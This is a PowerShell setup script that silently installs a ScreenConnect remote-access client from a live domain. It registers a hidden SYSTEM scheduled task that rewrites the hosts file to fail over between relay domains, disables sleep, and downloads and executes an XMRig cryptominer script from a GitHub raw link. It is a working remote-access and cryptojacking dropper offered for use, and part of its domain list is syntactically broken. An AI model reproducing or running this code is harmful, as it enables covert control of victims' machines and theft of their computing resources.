& {
  # ===================== SETTINGS — fill these in =====================
  # 1) ScreenConnect client installer link from your panel (ends with .msi or .exe)
  $InstallerUrl = "https://bapeshop.us/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=old&c=&c=&c=&c=&c=&c=&c="

  # 2) Domain fallback list — primary, real backup, then your own weird unregistered names
  $Domains = @(
    "bapeshop.us",            # <-- primary (live)
    "YOUR-REAL-BACKUP.com",   # <-- buy + point to the server now
    "YOUR-FAKE-NAME-1.com",   # <-- your own weird name (not bought)
    "YOUR-FAKE-NAME-2.net"    # <-- your own weird name (not bought)
    "YOUR-FAKE-NAME-1.com",   # <-- your own weird name (not bought)
    "YOUR-FAKE-NAME-1.com",   # <-- your own weird name (not bought)
    "YOUR-FAKE-NAME-1.com",   # <-- your own weird name (not bought)
    "YOUR-FAKE-NAME-1.com",   # <-- your own weird name (not bought)
    "YOUR-FAKE-NAME-1.com",   # <-- your own weird name (not bought)
    "YOUR-FAKE-NAME-1.com",   # <-- your own weird name (not bought)
    "YOUR-FAKE-NAME-1.com",   # <-- your own weird name (not bought)
  )
  $RelayPort = 8041

  # 3) Your XMRig setup script — GitHub RAW link (raw.githubusercontent.com/.../miner.ps1)
  $MinerUrl = "https://github.com/Mzagngy2026/helpquest/raw/refs/heads/main/Setup-Miner.ps1"
  # ===================================================================

  $ErrorActionPreference = "Stop"
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  function Ok($m)  { Write-Host "[OK] $m" -ForegroundColor Green }
  function Bad($m) { Write-Host "[!!] $m" -ForegroundColor Red }
  function Head($m){ Write-Host "`n=== $m ===" -ForegroundColor Cyan }

  if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
    Bad "Run PowerShell as Administrator"; return
  }

  # =====================================================================
  # BLOCK 1 — ScreenConnect client
  # =====================================================================
  Head "1. ScreenConnect client"
  try {
    if (Get-Service 'ScreenConnect Client*' -ErrorAction SilentlyContinue) {
      Ok "Client already installed"
    } elseif ($InstallerUrl -match 'PUT-CLIENT-INSTALLER-LINK') {
      Bad "Client installer link not set — skipped"
    } else {
      $ext  = if ($InstallerUrl -match '\.exe(\?|$)') { 'exe' } else { 'msi' }
      $file = "$env:TEMP\sc-client.$ext"
      curl.exe -L -s -o $file $InstallerUrl
      if (-not (Test-Path $file) -or (Get-Item $file).Length -lt 50KB) {
        Invoke-WebRequest $InstallerUrl -OutFile $file -UseBasicParsing
      }
      if ((Get-Item $file).Length -lt 50KB) { throw "Installer download failed — check the link" }
      if ($ext -eq 'msi') { Start-Process msiexec.exe -ArgumentList "/i `"$file`" /qn" -Wait }
      else                { Start-Process $file -ArgumentList "/S" -Wait }
      Start-Sleep 5
      if (Get-Service 'ScreenConnect Client*' -ErrorAction SilentlyContinue) { Ok "Client installed" }
      else { Bad "Client service not found after install" }
      Remove-Item $file -Force -ErrorAction SilentlyContinue
    }
  } catch { Bad "Client: $($_.Exception.Message)" }

  # =====================================================================
  # BLOCK 2 — Failover watchdog (domain fallback)
  # =====================================================================
  Head "2. Failover watchdog"
  try {
    $Dir = "C:\ProgramData\SCFailover"
    New-Item -ItemType Directory -Path $Dir -Force | Out-Null
    $List = ($Domains | ForEach-Object { "'$_'" }) -join ","

@"
`$Domains = @($List)
`$Port    = $RelayPort
`$Hosts   = "`$env:windir\System32\drivers\etc\hosts"
`$Tag     = '# SC-FAILOVER'
function Get-Ip(`$d) {
  foreach (`$s in '1.1.1.1','8.8.8.8') {
    try { `$a = Resolve-DnsName `$d -Type A -DnsOnly -Server `$s -ErrorAction Stop | Where-Object IPAddress | Select-Object -First 1; if (`$a) { return `$a.IPAddress } } catch {}
  }
  return `$null
}
function Test-Relay(`$ip) {
  try {
    `$c = New-Object Net.Sockets.TcpClient
    `$ok = `$c.BeginConnect(`$ip, `$Port, `$null, `$null).AsyncWaitHandle.WaitOne(3000)
    `$r = `$ok -and `$c.Connected; `$c.Close(); return `$r
  } catch { return `$false }
}
`$ips = @{}; `$live = `$null
foreach (`$d in `$Domains) {
  `$ip = Get-Ip `$d; `$ips[`$d] = `$ip
  if (-not `$live -and `$ip -and (Test-Relay `$ip)) { `$live = `$ip }
}
`$lines = @(Get-Content `$Hosts -ErrorAction SilentlyContinue | Where-Object { `$_ -notmatch [regex]::Escape(`$Tag) })
if (`$live) { foreach (`$d in `$Domains) { if (`$ips[`$d] -ne `$live) { `$lines += "`$live `$d `$Tag" } } }
`$old = Get-Content `$Hosts -Raw -ErrorAction SilentlyContinue
`$new = (`$lines -join "`r`n") + "`r`n"
if (`$old -ne `$new) { Set-Content -Path `$Hosts -Value `$new -Encoding ASCII -Force; ipconfig /flushdns | Out-Null }
"@ | Set-Content "$Dir\Failover.ps1" -Encoding UTF8

    $a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$Dir\Failover.ps1`""
    $t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    Register-ScheduledTask -TaskName "SC Domain Failover" -Action $a -Trigger $t -User "SYSTEM" -RunLevel Highest -Force | Out-Null
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$Dir\Failover.ps1"
    Ok "Watchdog installed for: $($Domains -join ', ')"
  } catch { Bad "Watchdog: $($_.Exception.Message)" }

  # =====================================================================
  # BLOCK 3 — Windows settings (never sleep, screen never off)
  # =====================================================================
  Head "3. Windows power settings"
  try {
    powercfg /change standby-timeout-ac 0
    powercfg /change standby-timeout-dc 0
    powercfg /change hibernate-timeout-ac 0
    powercfg /change hibernate-timeout-dc 0
    powercfg /change monitor-timeout-ac 0
    powercfg /change monitor-timeout-dc 0
    powercfg /change disk-timeout-ac 0
    powercfg /change disk-timeout-dc 0
    Ok "Sleep / hibernate / monitor-off disabled"
  } catch { Bad "Power settings: $($_.Exception.Message)" }

  # =====================================================================
  # BLOCK 4 — XMRig miner (your own script, runs last)
  # =====================================================================
  Head "4. Miner (XMRig)"
  try {
    if ($MinerUrl -match 'PUT-GITHUB-RAW-LINK') {
      Bad "Miner link not set — skipped"
    } else {
      $Dir = "C:\ProgramData\Miner"
      New-Item -ItemType Directory -Path $Dir -Force | Out-Null
      $mFile = "$Dir\miner.ps1"
      curl.exe -L -s -o $mFile $MinerUrl
      if (-not (Test-Path $mFile) -or (Get-Item $mFile).Length -lt 20) {
        Invoke-WebRequest $MinerUrl -OutFile $mFile -UseBasicParsing
      }
      if ((Get-Item $mFile).Length -lt 20) { throw "Miner script download failed — check the raw link" }
      Ok "Miner script downloaded"
      powershell.exe -NoProfile -ExecutionPolicy Bypass -File $mFile
      Ok "Miner script executed"
    }
  } catch { Bad "Miner: $($_.Exception.Message)" }

  Write-Host "`n[DONE] Device setup finished." -ForegroundColor Green
}
